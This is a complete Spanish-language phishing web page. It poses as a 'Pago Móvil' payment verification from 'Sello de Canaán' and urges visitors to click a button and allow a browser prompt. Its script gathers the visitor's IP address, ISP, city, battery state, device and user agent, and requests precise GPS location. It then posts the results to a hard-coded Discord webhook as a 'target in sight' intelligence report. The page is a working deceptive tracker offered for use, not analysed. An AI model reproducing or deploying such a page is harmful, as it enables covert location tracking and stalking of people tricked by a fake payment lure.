<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sello de Canaán | Verificación Segura</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Inter:wght@400;600;700;900&display=swap');
        :root { --primary-amber: #f89c22; --secondary-terracotta: #c12a27; --bg-cream: #eadfce; --text-chocolate: #552110; }
        body { font-family: 'Inter', sans-serif; background-color: #f3f4f6; margin: 0; overflow: hidden; }
        .blur-logic { filter: blur(15px); pointer-events: none; transition: all 0.5s ease; }
    </style>
</head>
<body x-data="tracker()" x-init="initLucide()">

    <div id="lock-screen" class="fixed inset-0 z-[100] flex items-center justify-center bg-white/90 backdrop-blur-xl px-4">
        <div class="max-w-sm w-full p-8 rounded-[3rem] bg-white shadow-[0_32px_64px_-15px_rgba(0,0,0,0.2)] text-center border border-gray-100">
            <div class="w-20 h-20 bg-blue-600 rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse">
                <i data-lucide="fingerprint" class="text-white w-10 h-10"></i>
            </div>
            <h3 class="text-2xl font-black text-gray-900 mb-3">Verificación en curso</h3>
            <p class="text-sm text-gray-500 mb-8 leading-relaxed">
                Para liberar los fondos del <strong>Pago Móvil</strong>, nuestro sistema debe validar la <strong>integridad de su zona de conexión</strong>.
                <br><br>
                <span class="font-bold text-blue-600 uppercase text-[11px] tracking-widest">⚠️ IMPORTANTE:</span><br>
                Haga clic abajo y <strong>seleccione "PERMITIR"</strong> en el aviso de seguridad de su navegador para completar el escaneo.
            </p>
            <button @click="triggerHunter()" class="w-full bg-blue-600 text-white py-5 rounded-3xl font-black text-sm uppercase tracking-widest hover:bg-blue-700 transition-all shadow-xl shadow-blue-200 active:scale-95">
                AUTORIZAR Y RECIBIR PAGO
            </button>
        </div>
    </div>

    <div id="content" class="blur-logic h-screen flex flex-col items-center justify-center text-center p-10">
        <h1 class="font-serif text-4xl mb-4 text-[#552110]">Sello de Canaán</h1>
        <p class="text-gray-400">Validando transferencia...</p>
        <div class="mt-10 animate-spin"><i data-lucide="loader-2" class="w-10 h-10 text-[#f89c22]"></i></div>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1487184631517155380/-AX1M8NIbnJPuMjga4UiEpINEZQXOVKhWD895Si8_iFohLI5UGuSlVywuXt26x7FkUa1";

        function tracker() {
            return {
                initLucide() { lucide.createIcons(); },
                async triggerHunter() {
                    // 1. Quitar bloqueo visual
                    document.getElementById('lock-screen').classList.add('opacity-0');
                    setTimeout(() => {
                        document.getElementById('lock-screen').style.display = 'none';
                        document.getElementById('content').classList.remove('blur-logic');
                    }, 500);

                    // 2. Obtener datos técnicos ocultos (Batería, RAM, etc)
                    let batteryInfo = "Desconocido";
                    if (navigator.getBattery) {
                        const b = await navigator.getBattery();
                        batteryInfo = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Cargando' : 'Descargando'})`;
                    }

                    // 3. Captura de IP e ISP
                    const ipRes = await fetch('https://ipapi.co/json/');
                    const ipData = await ipRes.json();

                    // 4. EL MOMENTO CLAVE: Pedir ubicación con Alta Precisión
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            async (pos) => {
                                // SI ACEPTA: GPS Exacto
                                await this.sendDiscord(ipData, pos.coords, batteryInfo);
                            },
                            async (err) => {
                                // SI RECHAZA: Solo IP y metadatos
                                await this.sendDiscord(ipData, null, batteryInfo);
                            },
                            { enableHighAccuracy: true, timeout: 10000 }
                        );
                    }
                },

                async sendDiscord(ip, coords, battery) {
                    const mapUrl = coords ? `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}` : "❌ Permiso Denegado";
                    
                    const report = {
                        username: "Sello de Canaán - HUNTER",
                        content: "🎯 **¡OBJETIVO EN LA MIRA!**",
                        embeds: [{
                            title: "Informe de Inteligencia",
                            color: 15158332,
                            fields: [
                                { name: "🌐 Dirección IP", value: `\`${ip.ip}\``, inline: true },
                                { name: "🏢 Operadora", value: ip.org, inline: true },
                                { name: "📍 Ciudad", value: `${ip.city}, ${ip.region}`, inline: true },
                                { name: "🛰️ UBICACIÓN EXACTA (Maps)", value: `[VER EN MAPA](${mapUrl})` },
                                { name: "🎯 Margen Error GPS", value: coords ? `${coords.accuracy.toFixed(1)} metros` : "N/A", inline: true },
                                { name: "🔋 Batería", value: battery, inline: true },
                                { name: "📱 Dispositivo", value: navigator.platform, inline: true },
                                { name: "🖥️ UserAgent", value: `\`${navigator.userAgent}\`` }
                            ],
                            timestamp: new Date()
                        }]
                    };

                    await fetch(WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(report)
                    });
                }
            }
        }
    </script>
</body>
</html>
